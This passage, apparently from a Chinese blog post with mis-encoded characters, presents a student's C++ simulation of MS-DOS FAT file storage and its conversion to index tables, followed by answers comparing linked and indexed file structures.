i++)<br>        <span class="hljs-keyword">if</span> (fd.name[i] == filename)<br>            <span class="hljs-keyword">return</span> i;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">/* int finduser(string name)</span><br><span class="hljs-comment">&#123;</span><br><span class="hljs-comment">    map&lt;string, Filetab&gt;::iterator iter;</span><br><span class="hljs-comment">    iter = usertab.find(name);</span><br><span class="hljs-comment">    if (iter == usertab.end())</span><br><span class="hljs-comment">        return 0;</span><br><span class="hljs-comment">    else</span><br><span class="hljs-comment">        return 1;</span><br><span class="hljs-comment">&#125; */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">save</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    string filename;<br>    cout &lt;&lt; <span class="hljs-string">&quot;è¯·è¾“å…¥æ–‡ä»¶å: &quot;</span>;<br>    cin &gt;&gt; filename;<br>    <span class="hljs-comment">//é¦–å…ˆå¯»æ‰¾æ˜¯ä¸æ˜¯æœ‰åŒåçš„æ–‡ä»¶</span><br>    <span class="hljs-comment">//å¦‚æœæœ‰åˆ™ä¸èƒ½é‡å¤æ’å…¥</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FindFile</span>(filename) != <span class="hljs-number">0</span>)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;********å­˜åœ¨åŒåæ–‡ä»¶ï¼Œå­˜æ“ä½œæ‰§è¡Œå¤±è´¥ï¼********&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">int</span> num;<br>    cout &lt;&lt; <span class="hljs-string">&quot;è¯·è¾“å…¥é€»è¾‘è®°å½•é•¿åº¦: &quot;</span>;<br>    cin &gt;&gt; num;<br>    <span class="hljs-comment">//æ£€æŸ¥å†…å­˜å‰©ä½™çš„ç©ºé—´æ˜¯ä¸æ˜¯å¤Ÿå­˜å‚¨</span><br><br>    <span class="hljs-keyword">if</span> (num &gt; leftblocks)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;********å­˜å‚¨çš„æ–‡ä»¶è¿‡å¤§ï¼Œæ— æ³•å­˜å‚¨ï¼********&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">//è®°å½•æ–‡ä»¶åç§°</span><br>    fd.name[++fd.filenum] = filename;<br>    fd.filelength[fd.filenum] = num;<br>    <span class="hljs-keyword">int</span> pos = <span class="hljs-number">0</span>, lastpos;<br>    <span class="hljs-comment">//æ‰¾ num ä¸ªç©ºçš„å†…å­˜å—æ¥å­˜å‚¨ï¼ŒåŒæ—¶æ›´æ–°ç´¢å¼•</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= num; i++)<br>    &#123;<br>        <span class="hljs-comment">//æ‰¾åˆ°ä¸€ä¸ªç©ºçš„ä½ç½®</span><br>        <span class="hljs-keyword">while</span> (fat[pos] != <span class="hljs-number">0</span>)<br>            pos = (pos + <span class="hljs-number">1</span>) % <span class="hljs-number">32</span>;<br>        <span class="hljs-comment">//å¦‚æœæ˜¯æ–‡ä»¶çš„èµ·å§‹å—å·åˆ™ç›´æ¥å­˜å‚¨ä¸‹ä¸€ä¸ªå—çš„ç´¢å¼•</span><br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">1</span>)<br>            fd.start[fd.filenum] = pos;<br>        <span class="hljs-comment">//ä¸æ˜¯èµ·å§‹å—åˆ™å°†ä¸Šä¸€ä¸ªå—çš„ç´¢å¼•è®¾ç½®æˆå½“å‰çš„åœ°å€</span><br>        <span class="hljs-keyword">else</span><br>            fat[lastpos] = pos;<br>        <span class="hljs-comment">//è®°å½•å½“å‰åœ°å€ï¼Œå®é™…çš„å¤åˆ¶å†…å®¹ç”±ä¸‹ä¸€ä¸ªå—çš„åœ°å€å†³å®š</span><br>        lastpos = pos;<br>        <span class="hljs-comment">//ä»ä¸‹ä¸€ä¸ªå—å¼€å§‹æ‰¾ï¼Œç©ºå‡ºå½“å‰åœ°å€ç•™å¾…ä½¿ç”¨</span><br>        pos++;<br>        <span class="hljs-comment">//å‰©ä½™çš„å—å°‘ä¸€ä¸ª</span><br>        leftblocks--;<br>    &#125;<br>    <span class="hljs-comment">//å°†æ–‡ä»¶çš„ç»“å°¾æ‰§è¡Œç»Ÿä¸€çš„ç»“æŸç¬¦ FFF</span><br>    fat[lastpos] = FFF;<br>    cout &lt;&lt; <span class="hljs-string">&quot;********æ–‡ä»¶å­˜å‚¨æˆåŠŸï¼********&quot;</span> &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-comment">//æ’å…¥æ–‡ä»¶æ“ä½œ</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">insert</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    string filename;<br>    cout &lt;&lt; <span class="hljs-string">&quot;è¯·è¾“å…¥æ–‡ä»¶å:&quot;</span>;<br>    cin &gt;&gt; filename;<br>    <span class="hljs-comment">//é¦–å…ˆæŸ¥æ‰¾æ–‡ä»¶ç›®å½•ä¸­æ˜¯å¦æœ‰è¿™ä¸ªæ–‡ä»¶</span><br>    <span class="hljs-comment">//å¦‚æœæœ‰è¿™ä¸ªæ–‡ä»¶åˆ™è®°å½•åœ¨æ–‡ä»¶ç›®å½•ä¸­çš„ç´¢å¼•</span><br>    <span class="hljs-keyword">int</span> pos = <span class="hljs-built_in">FindFile</span>(filename);<br>    <span class="hljs-comment">//å¦‚æœæ²¡æœ‰è¿™ä¸ªæ–‡ä»¶åˆ™æ’å…¥ä¸èƒ½å®Œæˆ</span><br>    <span class="hljs-keyword">if</span> (pos == <span class="hljs-number">0</span>)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;********ä¸å­˜åœ¨è¯¥æ–‡ä»¶ï¼Œæ’å…¥å¤±è´¥ï¼********&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">//å°†è¿™ä¸ªå—æ’å…¥åˆ°æ–‡ä»¶çš„ç¬¬ num ä¸ªä½ç½®</span><br>    <span class="hljs-keyword">int</span> num;<br>    cout &lt;&lt; <span class="hljs-string">&quot;è¯·è¾“å…¥è¦æ’å…¥çš„æ–‡ä»¶é€»è¾‘ä½ç½®:&quot;</span>;<br>    cin &gt;&gt; num;<br>    <span class="hljs-comment">//åˆ¤æ–­æ˜¯å¦æœ‰ç©ºé—´å­˜å‚¨è¿™ä¸ªæ’å…¥çš„å—</span><br>    <span class="hljs-keyword">if</span> (leftblocks == <span class="hljs-number">0</span>)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;********æ— ç©ºé—²å—ï¼Œæ’å…¥å¤±è´¥ï¼********&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">//æ‰¾ä¸€ä¸ªç©ºé—²çš„ä½ç½®æ¥å­˜æ”¾è¦æ’å…¥çš„å—</span><br>    <span class="hljs-keyword">int</span> p = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (fat[p] != <span class="hljs-number">0</span>)<br>        p++;<br>    <span class="hljs-comment">//å¦‚æœè¦åœ¨ç¬¬ä¸€ä¸ªä½ç½®æ’å…¥ï¼Œåˆ™æ›´æ–°èµ·å§‹å—å·</span><br>    <span class="hljs-keyword">if</span> (num == <span class="hljs-number">1</span>)<br>    &#123;<br>        fat[p] = fd.start[pos];<br>        fd.start[pos] = p;<br>    &#125;<br>    <span class="hljs-comment">//ä¸æ˜¯åœ¨ç¬¬ä¸€ä¸ªä½ç½®æ’å…¥</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (num &gt;= <span class="hljs-number">2</span>)<br>    &#123;<br>        <span class="hljs-comment">//æ‰¾åˆ°è¦æ’å…¥ä½ç½®çš„å‰ä¸€ä¸ªå—å·</span><br>        <span class="hljs-keyword">int</span> temp = fd.start[pos];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; num - <span class="hljs-number">1</span>; i++)<br>            temp = fat[temp];<br>        <span class="hljs-comment">//å°†æ–°çš„ä½ç½®çš„ä¸‹ä¸€ä¸ªç´¢å¼•æŒ‡å‘åŸæ¥çš„ä¸‹ä¸€ä¸ªå—</span><br>        fat[p] = fat[temp];<br>        <span class="hljs-comment">//å°†ä¸Šä¸€ä¸ªå—çš„ä¸‹ä¸€ä¸ªç´¢å¼•æŒ‡å‘æ–°çš„ä½ç½®ï¼Œå®Œæˆæ’å…¥</span><br>        fat[temp] = p;<br>    &#125;<br>    <span class="hljs-comment">//æ›´æ–°å‰©ä½™çš„å†…å­˜å—</span><br>    leftblocks--;<br>    fd.filelength[pos]++;<br>    cout &lt;&lt; <span class="hljs-string">&quot;********æ’å…¥æ–‡ä»¶å—æˆåŠŸï¼********&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">change_to_index</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;   <span class="hljs-comment">//æ‰“å°å½“å‰æ–‡ä»¶ç›®å½•</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å½“å‰æ–‡ä»¶ç›®å½•ï¼š\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-------------------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-----------æ–‡ä»¶ç›®å½•------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-------------------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|  æ–‡ä»¶å   èµ·å§‹ä½ç½®  é€»è¾‘é•¿åº¦  |\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= fd.filenum; i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|  %6s  %8d  %9d  |\n&quot;</span>, fd.name[i].<span class="hljs-built_in">c_str</span>(), fd.start[i], fd.filelength[i]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-------------------------------|\n&quot;</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥ç”¨æˆ·åï¼ŒæŒ‰qé€€å‡º\n&quot;</span>);<br>        string name;<br>        cin &gt;&gt; name;<br>        <span class="hljs-keyword">if</span> (name == <span class="hljs-string">&quot;q&quot;</span>)<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥å½“å‰ç”¨æˆ·çš„æ–‡ä»¶åï¼ŒæŒ‰qé€€å‡º\n&quot;</span>);<br>                string file;<br>                cin &gt;&gt; file;<br>                <span class="hljs-keyword">if</span> (file == <span class="hljs-string">&quot;q&quot;</span>)<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    <span class="hljs-keyword">int</span> t = <span class="hljs-built_in">FindFile</span>(file);<br>                    <span class="hljs-keyword">if</span> (!t)<br>                    &#123;<br>                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ä¸å­˜åœ¨è¯¥æ–‡ä»¶ï¼Œè¯·é‡æ–°è¾“å…¥æ–‡ä»¶åï¼š&quot;</span>);<br>                        <span class="hljs-keyword">continue</span>;<br>                    &#125;<br>                    <span class="hljs-keyword">else</span><br>                    &#123;<br>                        usertab[name].filetab[file].length = <span class="hljs-number">0</span>;<span class="hljs-comment">//åˆå§‹åŒ–ç”¨æˆ·æ–‡ä»¶è¡¨è®°å½•æ•°</span><br>                        <span class="hljs-keyword">int</span> cpos = fd.start[t];<br>                        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; fd.filelength[t]; i++)<br>                        &#123;<br>                            usertab[name].filetab[file].tab[i] = cpos;<span class="hljs-comment">//è®°å½•ç‰©ç†å—å·</span><br>                            cpos = fat[cpos];<span class="hljs-comment">//åˆ°ä¸‹ä¸€ä¸ªç‰©ç†å—</span><br>                            usertab[name].filetab[file].length++;<span class="hljs-comment">//è®°å½•æ•°åŠ ä¸€</span><br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">info_change_after</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    map&lt;string, Filetab&gt;::iterator it;<br>    map&lt;string, Indextab&gt;::iterator fileit;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;**********************************\n&quot;</span>);<br>    <span class="hljs-comment">// fflush(stdin);</span><br>    <span class="hljs-keyword">for</span> (it = usertab.<span class="hljs-built_in">begin</span>(); it != usertab.<span class="hljs-built_in">end</span>(); it++)<br>    &#123;<br>        <span class="hljs-comment">// fflush(stdin); //é‡å†™æ“ä½œã€‚ç›®çš„æ˜¯æ¸…é™¤ç¼“å­˜ã€‚</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n|-----------------------|\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|----ç”¨æˆ·%4sçš„ç´¢å¼•è¡¨---|\n&quot;</span>, it-&gt;first.<span class="hljs-built_in">c_str</span>());<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-----------------------|\n&quot;</span>);<br>        <span class="hljs-keyword">for</span> (fileit = usertab[it-&gt;first].filetab.<span class="hljs-built_in">begin</span>(); fileit != usertab[it-&gt;first].filetab.<span class="hljs-built_in">end</span>(); fileit++)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|--------æ–‡ä»¶å:%s-------|\n&quot;</span>, fileit-&gt;first.<span class="hljs-built_in">c_str</span>());<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|   è®°å½•å·   ç‰©ç†å—å·   |\n&quot;</span>);<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; fileit-&gt;second.length; j++)<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;| %8d   %8d   |\n&quot;</span>, j + <span class="hljs-number">1</span>, fileit-&gt;second.tab[j]);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-----------------------|\n&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//è¾“å‡ºæ–‡ä»¶ç›®å½•å’Œ fat</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">info</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-------------------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-----------æ–‡ä»¶ç›®å½•------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-------------------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|  æ–‡ä»¶å   èµ·å§‹ä½ç½®  é€»è¾‘é•¿åº¦  |\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= fd.filenum; i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|  %6s  %8d  %9d  |\n&quot;</span>, fd.name[i].<span class="hljs-built_in">c_str</span>(), fd.start[i], fd.filelength[i]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-------------------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n|--------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|---æ–‡ä»¶å®šä½è¡¨(fat)--|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|--------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|    ç´¢å¼•    å†…å®¹    |\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|      0      FDF    |\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|      1      FFF    |\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">2</span>; i &lt; <span class="hljs-number">32</span>; i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|   %4d    %4d     |\n&quot;</span>, i, fat[i]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|--------------------|\n\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//åŠŸèƒ½é€‰æ‹©æ¸…å•</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">choicelist</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|====================================================================|&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|---------------MS-DOSç£ç›˜æ–‡ä»¶å­˜å‚¨ç®¡ç†èœå•å’Œç´¢å¼•æ–‡ä»¶ç»“æ„-------------|&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|                      1.å‘fatä¸­å­˜å‚¨ä¸€ä¸ªæ–‡ä»¶:                        |&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|                      2.å‘fatä¸­çš„æ–‡ä»¶æ’å…¥æ•°æ®:                      |&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|                      3.è¾“å‡ºå½“å‰æ–‡ä»¶ç›®å½•ä»¥åŠfatä¿¡æ¯:                |&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|                      4.è½¬æ¢æˆç´¢å¼•è¡¨:                               |&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|                      5.è¾“å‡ºè½¬æ¢åçš„ç´¢å¼•è¡¨:                         |&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|                      6.ç»“æŸæ“ä½œï¼Œé€€å‡ºç³»ç»Ÿ:                         |&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|====================================================================|&quot;</span> &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><br>    <span class="hljs-keyword">char</span> name[<span class="hljs-number">10</span>];<br>    <span class="hljs-built_in">init</span>();<br>    <span class="hljs-keyword">int</span> order;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-comment">//é€šè¿‡å­—ç¬¦ä¸²è¾“å…¥æ¥é€‰æ‹©æƒ³è¦æµ‹è¯•çš„åŠŸèƒ½</span><br>        <span class="hljs-built_in">choicelist</span>();<br>        cout &lt;&lt; <span class="hljs-string">&quot;è¯·è¾“å…¥ä½ è¦æ‰§è¡Œçš„æ“ä½œçš„ç¼–å·: &quot;</span>;<br>        cin &gt;&gt; order;<br>        <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (order)<br>        &#123;<br>        <span class="hljs-comment">//å­˜ ä¸€ä¸ªæ–‡ä»¶</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-built_in">save</span>();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//åœ¨æŒ‡å®šçš„æ–‡ä»¶ä¸­çš„ç‰¹å®šä½ç½®æ’å…¥ä¸€ä¸ªå—</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">insert</span>();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//æ˜¾ç¤ºå½“å‰çš„ç³»ç»Ÿä¿¡æ¯</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>            <span class="hljs-built_in">info</span>();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//æµ‹è¯•ç»“æŸé€€å‡ºç³»ç»Ÿ3</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>            <span class="hljs-built_in">change_to_index</span>();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>            <span class="hljs-built_in">info_change_after</span>();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>            cout &lt;&lt; <span class="hljs-string">&quot;ç³»ç»Ÿç»“æŸ&quot;</span> &lt;&lt; endl;<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//è¾“å…¥æŒ‡ä»¤ä¸åˆæ³•</span><br>        <span class="hljs-keyword">default</span>:<br>            cout &lt;&lt; <span class="hljs-string">&quot;æŒ‡ä»¤è¾“å…¥é”™è¯¯&quot;</span> &lt;&lt; endl;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ-2"><a class="markdownIt-Anchor" href="#ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ-2"></a> ç¨‹åºåˆå€¼å’Œè¿è¡Œç»“æœ</h4><p>è½¬åŒ–æˆç´¢å¼•è¡¨ï¼š</p><p><img src="/posts/6255939a/image-20211219194600309.png" alt="image-20211219194600309"></p><p>æ‰“å°å½“å‰æ–‡ä»¶ç´¢å¼•è¡¨ï¼š</p><p><img src="/posts/6255939a/image-20211219194647820.png" alt="image-20211219194647820"></p><p>æ’å…¥æ–‡ä»¶åè¾“å‡ºæ–‡ä»¶fatè¡¨</p><p><img src="/posts/6255939a/image-20211219194915960.png" alt="image-20211219194915960"></p><p>å°†æ–°æ’å…¥çš„æ–‡ä»¶åŠ å…¥ç´¢å¼•ç»“æ„ä¸­ï¼š</p><p><img src="/posts/6255939a/image-20211219194954473.png" alt="image-20211219194954473"></p><p><img src="/posts/6255939a/image-20211219195026995.png" alt="image-20211219195026995"></p><h3 id="æ€è€ƒé¢˜-2"><a class="markdownIt-Anchor" href="#æ€è€ƒé¢˜-2"></a> æ€è€ƒé¢˜ï¼š</h3><p><strong>1. é“¾è¡¨æ–‡ä»¶ç»“æ„å’Œç´¢å¼•æ–‡ä»¶ç»“æ„å„è‡ªçš„ä¼˜ç¼ºç‚¹æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p><ul><li><p><strong>é“¾å¼ç»“æ„</strong></p><p>ä¼˜ç‚¹ï¼š</p><ol><li>åŠ¨æ€æ•°æ®ç»“æ„ï¼šé“¾è¡¨æ˜¯ä¸€ç§åŠ¨æ€æ•°æ®ç»“æ„ï¼Œå› æ­¤å®ƒå¯ä»¥åœ¨è¿è¡Œæ—¶é€šè¿‡åˆ†é…å’Œå–æ¶ˆåˆ†é…å†…å­˜æ¥å¢é•¿å’Œç¼©å°ã€‚æ‰€ä»¥æ²¡æœ‰å¿…è¦ç»™å‡ºé“¾è¡¨çš„åˆå§‹å¤§å°ã€‚</li><li>æ˜“äºæ’å…¥å’Œåˆ é™¤ï¼šåœ¨é“¾è¡¨ä¸­è¿›è¡Œæ’å…¥å’Œåˆ é™¤èŠ‚ç‚¹çœŸçš„å¾ˆå®¹æ˜“ã€‚åœ¨é“¾è¡¨ä¸­ï¼Œæˆ‘ä»¬åªéœ€è¦æ›´æ–°èŠ‚ç‚¹ä¸‹ä¸€ä¸ªæŒ‡é’ˆä¸­çš„åœ°å€ã€‚</li><li>ç£ç›˜ç©ºé—´åˆ©ç”¨ç‡ã€å†…å­˜åˆ©ç”¨ç‡é«˜ï¼šç”±äºé“¾è¡¨çš„å¤§å°å¯ä»¥åœ¨è¿è¡Œæ—¶å¢åŠ æˆ–å‡å°‘ï¼Œå› æ­¤æ²¡æœ‰å†…å­˜æµªè´¹ã€‚</li></ol><p>ç¼ºç‚¹ï¼š</p><ol><li>å­˜å–é€Ÿåº¦æ…¢ï¼Œä¸é€‚äºéšæœºå­˜å–ï¼›</li><li>å½“ç‰©ç†å—é—´çš„è¿æ¥æŒ‡é’ˆå‡ºé”™æ—¶ï¼Œæ•°æ®ä¸¢å¤±ï¼›</li><li>æ›´å¤šçš„å¯»é“æ¬¡æ•°å’Œå¯»é“æ—¶é—´ï¼›é“¾æ¥æŒ‡é’ˆå ç”¨ä¸€å®šçš„ç©ºé—´ï¼Œé™ä½äº†ç©ºé—´åˆ©ç”¨ç‡ã€‚</li></ol></li><li><p><strong>ç´¢å¼•ç»“æ„</strong><br>ä¼˜ç‚¹ï¼š</p><ol><li>é€šè¿‡åˆ›å»ºå”¯ä¸€æ€§ç´¢å¼•ï¼Œå¯ä»¥ä¿è¯æ•°æ®åº“è¡¨ä¸­æ¯ä¸€è¡Œæ•°æ®çš„å”¯ä¸€æ€§ï¼›</li><li>å¯ä»¥å¤§å¤§åŠ å¿«æ•°æ®çš„æ£€ç´¢é€Ÿåº¦ï¼Œè¿™ä¹Ÿæ˜¯åˆ›å»ºç´¢å¼•çš„æœ€ä¸»è¦çš„åŸå› ï¼›å¯ä»¥åŠ é€Ÿè¡¨å’Œè¡¨ä¹‹é—´çš„è¿æ¥ï¼Œç‰¹åˆ«æ˜¯åœ¨å®ç°æ•°æ®çš„å‚è€ƒå®Œæ•´æ€§æ–¹é¢ç‰¹åˆ«æœ‰æ„ä¹‰ï¼›</li><li>åœ¨ä½¿ç”¨åˆ†ç»„å’Œæ’åºå­å¥è¿›è¡Œæ•°æ®æ£€ç´¢æ—¶ï¼ŒåŒæ ·å¯ä»¥æ˜¾è‘—å‡å°‘æŸ¥è¯¢ä¸­åˆ†ç»„å’Œæ’åºçš„æ—¶é—´ï¼›</li><li>é€šè¿‡ä½¿ç”¨ç´¢å¼•ï¼Œå¯ä»¥åœ¨æŸ¥è¯¢çš„è¿‡ç¨‹ä¸­ï¼Œä½¿ç”¨ä¼˜åŒ–éšè—å™¨ï¼Œæé«˜ç³»ç»Ÿçš„æ€§èƒ½ã€‚</li></ol><p>ç¼ºç‚¹ï¼š</p><ol><li>åˆ›å»ºç´¢å¼•å’Œç»´æŠ¤ç´¢å¼•è¦è€—è´¹æ—¶é—´ï¼Œå› ä¸ºè¿™å¯¼è‡´äº†è¾ƒå¤šçš„å¯»é“æ¬¡æ•°å’Œå¯»é“æ—¶é—´ï¼Œè¿™ç§æ—¶é—´éšç€æ•°æ®é‡çš„å¢åŠ è€Œå¢åŠ ï¼›</li><li>ç´¢å¼•éœ€è¦å ç‰©ç†ç©ºé—´ï¼Œé™¤äº†æ•°æ®è¡¨å æ•°æ®ç©ºé—´ä¹‹å¤–ï¼Œæ¯ä¸€ä¸ªç´¢å¼•è¿˜è¦å ä¸€å®šçš„ç‰©ç†ç©ºé—´ï¼Œå¦‚æœè¦å»ºç«‹èšç°‡ç´¢å¼•ï¼Œé‚£ä¹ˆéœ€è¦çš„ç©ºé—´å°±ä¼šæ›´å¤§ï¼›</li><li>å½“å¯¹è¡¨ä¸­çš„æ•°æ®è¿›è¡Œå¢åŠ ã€åˆ é™¤å’Œä¿®æ”¹çš„æ—¶å€™ï¼Œç´¢å¼•ä¹Ÿè¦åŠ¨æ€çš„ç»´æŠ¤ï¼Œè¿™æ ·å°±é™ä½äº†æ•°æ®çš„ç»´æŠ¤é€Ÿåº¦ã€‚</li></ol></li></ul><p><strong>2.å½“æ–‡ä»¶è¾ƒå¤§æ—¶ï¼Œä½¿å¾—ç´¢å¼•è¡¨ä¹Ÿè¾ƒå¤§ï¼Œå¦‚æœç´¢å¼•è¡¨çš„å¤§å°è¶…è¿‡äº†ä¸€ä¸ªç‰©ç†å—ï¼Œå¦‚ä½•è¿›è¡Œç´¢å¼•è¡¨çš„å­˜å–ï¼Ÿ</strong></p><p>å¦‚æœç´¢å¼•è¡¨çš„å¤§å°è¶…è¿‡äº†ä¸€ä¸ªç‰©ç†å—ï¼Œå¯ä»¥é‡‡ç”¨é—´æ¥ç´¢å¼•(å¤šé‡ç´¢å¼•)çš„æ–¹å¼æ¥è§£å†³ï¼Œä¹Ÿå°±æ˜¯åœ¨ç´¢å¼•è¡¨æ‰€æŒ‡çš„ç‰©ç†å—ä¸­å­˜æ”¾çš„ä¸æ˜¯æ–‡ä»¶ä¿¡æ¯ï¼Œè€Œæ˜¯è£…æœ‰è¿™äº›ä¿¡æ¯çš„ç‰©ç†å—åœ°å€ï¼Œè¿™æ 